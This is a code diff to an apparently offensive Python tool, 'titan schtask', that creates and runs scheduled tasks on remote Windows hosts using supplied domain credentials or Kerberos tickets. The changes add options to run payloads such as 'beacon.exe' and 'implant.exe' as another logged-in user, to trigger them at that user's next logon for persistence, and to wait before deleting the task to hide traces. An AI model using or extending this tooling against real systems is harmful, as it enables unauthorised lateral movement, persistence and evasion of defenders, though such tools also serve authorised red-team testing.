@@ -16,9 +16,16 @@ Usage:
   Kerberos:
     KRB5CCNAME=admin.ccache titan schtask query -k -t HOST.domain.local
 
-  Quick exec (create + run + optional cleanup):
+  Quick exec (create + run + cleanup):
     titan schtask exec DOMAIN/user:pass@HOST -c cmd.exe -a "/c whoami > C:\\out.txt"
     titan schtask exec DOMAIN/user:pass@HOST -c cmd.exe -a "/c whoami > C:\\out.txt" --no-delete
+
+  Run as a logged-in user (fires via RegistrationTrigger):
+    titan schtask exec DOMAIN/user:pass@HOST --run-as DOMAIN\\targetuser -c net.exe -a "use"
+    titan schtask exec DOMAIN/user:pass@HOST --run-as DOMAIN\\targetuser -c beacon.exe
+
+  Trigger on next logon:
+    titan schtask exec DOMAIN/user:pass@HOST --run-as DOMAIN\\targetuser --on-logon -c implant.exe --no-delete
 """
 
 import argparse
@@ -27,6 +34,7 @@ import random
 import string
 import subprocess
 import sys
+import time
 
 from titanlib.common import (find_binary, make_env, add_auth_args, auth_args,
                               apply_target_string, validate_auth)
@@ -138,6 +146,8 @@ def cmd_create(args):
         extra += ['-RunAs', args.run_as]
     if getattr(args, 'logon_type', None):
         extra += ['-RunAsLogon', args.logon_type]
+    if getattr(args, 'on_logon', False):
+        extra += ['-OnLogon']
     if args.update:
         extra += ['-Update']
     out, rc = _tsch('create', auth + [args.target], extra, verbose=args.verbose)
@@ -237,6 +247,8 @@ def cmd_exec(args):
         create_extra += ['-RunAs', args.run_as]
     if getattr(args, 'logon_type', None):
         create_extra += ['-RunAsLogon', args.logon_type]
+    if getattr(args, 'on_logon', False):
+        create_extra += ['-OnLogon']
     out, rc = _tsch('create', auth + [args.target], create_extra, verbose=args.verbose)
     if rc != 0:
         print(f'[!] Failed to create task (rc={rc})', file=sys.stderr)
@@ -246,13 +258,21 @@ def cmd_exec(args):
 
     print(f'[+] Created: {task_name}')
 
-    # Run
-    out, rc = _tsch('run', auth + [args.target], ['-TaskPath', task_name],
-                     verbose=args.verbose)
-    if rc == 0:
-        print(f'[+] Executed: {task_name}')
+    run_as = getattr(args, 'run_as', None)
+    if run_as:
+        print(f'[*] Task fires via RegistrationTrigger as {run_as}')
     else:
-        print(f'[!] Run failed (rc={rc})', file=sys.stderr)
+        out, rc = _tsch('run', auth + [args.target], ['-TaskPath', task_name],
+                         verbose=args.verbose)
+        if rc == 0:
+            print(f'[+] Executed: {task_name}')
+        else:
+            print(f'[!] Run failed (rc={rc})', file=sys.stderr)
+
+    wait = getattr(args, 'wait', 5)
+    if wait > 0 and not args.no_delete:
+        print(f'[*] Waiting {wait}s for execution...')
+        time.sleep(wait)
 
     # Delete unless --no-delete
     if not args.no_delete:
@@ -313,8 +333,10 @@ def build_parser():
     c.add_argument('--run-as', metavar='DOMAIN\\USER',
                    help='Run task as this user (default: SYSTEM)')
     c.add_argument('--logon-type', metavar='TYPE',
-                   choices=['Password', 'S4U', 'InteractiveToken', 'Group', 'ServiceAccount'],
-                   help='Logon type: Password, S4U, InteractiveToken, Group, ServiceAccount')
+                   choices=['Password', 'S4U', 'InteractiveToken'],
+                   help='Logon type: InteractiveToken (default with --run-as), Password, S4U')
+    c.add_argument('--on-logon', action='store_true',
+                   help='Trigger task when the --run-as user next logs in')
     c.add_argument('--update', action='store_true', help='Update if exists')
     add_auth_args(c)
     c.add_argument('-v', '--verbose', action='store_true')
@@ -384,10 +406,14 @@ def build_parser():
     x.add_argument('--run-as', metavar='DOMAIN\\USER',
                    help='Run task as this user (default: SYSTEM)')
     x.add_argument('--logon-type', metavar='TYPE',
-                   choices=['Password', 'S4U', 'InteractiveToken', 'Group', 'ServiceAccount'],
-                   help='Logon type: Password, S4U, InteractiveToken, Group, ServiceAccount')
+                   choices=['Password', 'S4U', 'InteractiveToken'],
+                   help='Logon type: InteractiveToken (default with --run-as), Password, S4U')
+    x.add_argument('--on-logon', action='store_true',
+                   help='Trigger task when the --run-as user next logs in')
     x.add_argument('--no-delete', action='store_true',
                    help='Leave task in place after execution')
+    x.add_argument('--wait', type=int, default=5, metavar='SEC',
+                   help='Seconds to wait before cleanup (default: 5)')
     add_auth_args(x)
     x.add_argument('-v', '--verbose', action='store_true')
     x.set_defaults(func=cmd_exec)
